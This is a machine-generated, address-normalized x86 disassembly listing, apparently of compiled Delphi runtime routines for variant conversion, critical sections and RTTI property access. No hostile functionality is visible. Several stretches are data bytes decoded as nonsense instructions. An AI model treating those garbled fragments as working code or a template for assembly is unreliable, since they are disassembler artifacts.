mov eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40929c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40929c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ebe4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404678
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ec1c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404678
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ec54
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404678
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407f80
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407f80
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5f4
jmp r-xdata
sub_40fb54
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e7fc
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fb90
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e7fc
sub_40fbbc
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e7fc
sub_40fc20
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fb0
pop esi
pop ebx
retn
mov eax ebx
call sub_40e7fc
sub_40fc4c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404838
pop esi
pop ebx
retn
mov eax ebx
call sub_40e7fc
sub_40fe08
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ff2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403fb0
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403fb0
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410264
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fb0
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404268
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407fa8
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404268
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403174
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4041c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ff35
lea eax [ ebp - 0x208 ]
call sub_403f5c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404268
sub_40ffb1
fcomp st3
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
cmp edi edi
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410264
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4101e4
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ffc0
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_410021
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404d24
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410028
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403224
sub_410070
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4101e4
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410264
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4100c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4100fc
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4101e4
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410138
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403598
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41019b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4101a2
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_41023c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410264
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41030c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d24
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_41031c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4103f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4103d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d2c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103dc
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403174
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041c0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407b60
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_41040c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41047b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410482
retn
call sub_40ffc0
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404eec
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4049d8
mov eax rw-data
call sub_403f5c
mov eax rw-data
call sub_40e88c
sub_410484
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410525
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41052c
retn
mov eax rw-data
call sub_40ff90
mov eax sub_40e58c
mov [ rw-data ] eax
mov eax sub_40e1b4
mov [ rw-data ] eax
mov edx sub_40e0c4
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e88c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fc84
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eba0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eecc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f5f4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410530
push esi
inc esi
add [ ebx + 0x640000ff ] ch
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
push esi
inc esi
add [ esi + 0x640000ff ] ch
push esi
inc esi
add [ edi + 0x640000ff ] ch
push esi
inc esi
add [ eax + 0x640000ff ] dl
push esi
inc esi
add [ ecx + 0x640000ff ] dl
push esi
inc esi
add [ edx + 0x640000ff ] dl
push esi
inc esi
add [ ebx + 0x640000ff ] dl
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] dl
inc esi
add [ ebp + 0x640000ff ] dl
push esi
inc esi
add [ esi + 0x640000ff ] dl
push esi
inc esi
add [ edi + 0x640000ff ] dl
push esi
inc esi
add [ eax + 0x640000ff ] bl
push esi
inc esi
add [ ecx + 0x640000ff ] bl
push esi
inc esi
add [ edx + 0x640000ff ] bl
push esi
inc esi
add [ ebx + 0x640000ff ] bl
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] bl
inc esi
add [ ebp + 0x640000ff ] bl
push esi
inc esi
add [ esi + 0x640000ff ] bl
push esi
inc esi
add [ edi + 0x640000ff ] bl
push esi
inc esi
add [ eax + 0x640000ff ] al
push esi
inc esi
add [ ecx + 0x640000ff ] al
push esi
inc esi
add [ edx + 0x640000ff ] al
push esi
inc esi
add [ ebx + 0x640000ff ] al
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] al
inc esi
add [ ebp + 0x640000ff ] al
push esi
inc esi
add [ esi + 0x640000ff ] al
push esi
inc esi
add [ edi + 0x550000ff ] al
mov ebp esp
xor eax eax
push ebp
push sub_41063d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410644
retn
sub_410688
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4106d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_41067c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407fd0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410688
mov edx [ rw-data ]
mov eax esi
call sub_407b60
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407b60
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407fd0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410738
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4107a8
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_41081c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410878
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4108cc
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4041f8
mov ecx esp
mov edx esi
mov eax ebx
call sub_410878
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410914
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410900
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410954
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41099c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404788
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4109d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4109a3
lea eax [ ebp - 0x4 ]
call sub_40463c
retn
sub_4109ac
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_4108cc
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410914
pop ebx
retn
dec bl
je r-xdata
call sub_410954
jmp r-xdata
pop ebx
retn
sub_4109d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410a9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041e4
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4109ac
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410aa5
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404678
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410aac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_41067c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410af4 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410c23 ]
jmp [ eax * 4 + jump_table_410b90 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410cb8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410ca4
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410cf8
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410d30
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410d6c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4055b0
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410de0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410e26
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e2d
retn
mov eax rw-data
call sub_403f5c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049d8
sub_410e38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410e5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e64
retn
sub_411781
pop ebp
pop ss
inc ecx
add [ ebx + 0x17 ] ch
inc ecx
add [ ebp + 0x17 ] dh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
adc [ edi ] 0x80041
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cld
pop ss
inc ecx
add [ ebp + 0x4117 ] cl
add [ eax ] al
add [ eax + ebx ] cl
inc ecx
add [ eax ] bh
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
